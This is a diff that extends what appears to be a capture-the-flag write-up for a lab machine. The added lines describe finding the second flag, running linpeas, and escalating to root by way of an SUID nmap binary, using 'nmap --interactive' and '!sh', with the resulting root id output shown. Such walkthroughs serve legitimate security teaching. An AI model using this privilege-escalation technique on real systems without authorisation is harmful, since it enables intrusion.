@@ -1024,7 +1024,27 @@ Now that we can access WP we can get a reverse shell modify the following templa
 	....
  	abcdefghijklmnopqrstuvwxyz (?)    
 
-Now login as robot user.
+Now login as robot user. In the home directory there is the second flag. Then I transfered linpeas.sh in /tmp folder, since, strange enough, we cannot write to the home folder. I found that nmap has suid permission:
+
+	╔══════════╣ SUID - Check easy privesc, exploits and write perms
+	...
+ 	-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
+Now we can use the following nmap feauture to get a shell as root:
+
+	
+	robot@linux:/tmp$ nmap --interactive
+	nmap --interactive
+	
+	Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+	Welcome to Interactive Mode -- press h <enter> for help
+
+Then we can spawn a new shell as root (note that EUDI, effective user id is root):
+
+	nmap> !sh 
+	!sh
+	# id
+	uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+
 
 
 
